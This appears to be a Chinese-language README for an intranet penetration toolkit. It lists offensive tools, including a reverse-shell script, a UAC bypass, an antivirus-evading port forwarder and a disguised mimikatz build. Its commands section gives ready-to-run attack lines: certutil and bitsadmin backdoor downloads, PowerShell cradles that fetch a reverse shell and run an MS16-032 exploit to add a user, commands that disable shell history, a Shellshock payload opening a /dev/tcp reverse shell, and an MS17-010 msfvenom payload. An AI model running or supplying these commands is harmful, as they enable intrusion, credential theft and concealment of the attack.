
Intranet Penetration

整理一些常用的内外网渗透测试工具

PHPoxy 通过PHP脚本运行一个可以访问内网机器的Web代理。

SocksCap  socks5代理客户端

XX-Net    科学上网利器 

phpsocks5 通过php脚本创建socks5代理服务

socks     包含创建socks5代理服务的python脚本，以及ssocks 内网穿透神器。

Cain      内网嗅探神器

F-NAScan  网络资产信息扫描

X-Sniff   网络嗅探小工具

asocks5  创建socks5代理服务的小公举

bc.pl    反弹bash shell的perl脚本

bypassUAC

http     创建HTTP服务

l.7z     lcx的slave版本，免杀

n.7z     nc.exe

smsniff2   抓包工具

wget     win版wget

get.7z  get64.7z  mimikatz无交互版 直接shell下运行 get.7z    (不是压缩文件)

### 常用命令

[![Join the chat at https://gitter.im/Intranet-Penetration/community](https://badges.gitter.im/Intranet-Penetration/community.svg)](https://gitter.im/Intranet-Penetration/community?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)

1、开web

python2 -m SimpleHTTPServer python3 -m http.server

2、download backdoor

certutil.exe -urlcache -split -f http://xxxx/g.jpg

bitsadmin /rawreturn /transfer getfile http://xxxx/g.jpgc:p.7z


3、tty

python -c 'import pty; pty.spawn("/bin/sh")'


4、powershell

root@kali:/tmp# wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

root@kali:/tmp# wget https://gist.githubusercontent.com/intrd/6dda33f61dca560e6996d01c62203374/raw/babf9a6afd23bb17a89bb3415099459db7bd25cf/ms16_032_intrd_mod.ps1

powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile('http://10.1.x.x:8000/Invoke-PowerShellTcp.ps1','Invoke-PowerShellTcp.ps1')

powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile('http://10.1.x.x:8000/ms16_032_intrd_mod.ps1','ms16_032_intrd_mod.ps1')


IEX (New-Object Net.WebClient).DownloadString('http://10.1.x.x:8000/ms16_032_intrd_mod.ps1');Invoke-MS16-032 "-NoProfile -ExecutionPolicy Bypass -Command net user a xxxx /ad"


5、不记录his

unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0

6、破壳漏洞

curl --user-agent '() { ignored;};/bin/bash -i >& /dev/tcp/xxx/3389 0>&1' http://xxx/cgi-bin/admin.cgi

7、ms17010

https://www.exploit-db.com/exploits/42315

msfvenom -p windows/shell/reverse_tcp lhost=xxx lport=3389 -f exe-service > f.exe

smb_send_file(smbConn, '/opt/17010/f.exe', 'C', '/f.exe') service_exec(conn, r'c:\\f.exe')

